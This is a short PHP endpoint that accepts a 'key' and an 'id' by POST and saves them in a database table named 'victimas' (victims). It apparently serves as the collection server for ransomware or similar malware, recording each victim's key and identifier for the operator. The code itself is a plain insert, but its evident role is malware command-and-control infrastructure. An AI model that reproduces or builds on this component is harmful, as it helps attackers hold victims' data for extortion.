<?php

    require "class/asir2database_class.php";
    $Db = new Asir2Database(DB_HOST, DB_NAME, DB_USER, DB_PASS, DB_CHAR);

    if ($_SERVER["REQUEST_METHOD"] == "POST") {

        if (isset($_POST['key']) and isset($_POST['id'])) {

            $key = $_POST['key'];
            $id = $_POST['id'];

            echo "0";
            #echo $key;
            #echo $id;

            $sql = 'INSERT INTO victimas (victima_key, victima_id) VALUES (?,?);';
            $insertar = $Db->consulta($sql, [$key, $id]);

            echo $insertar;

        } else {

            echo "1";
        }
    }

    $Db->desconecta();
?>
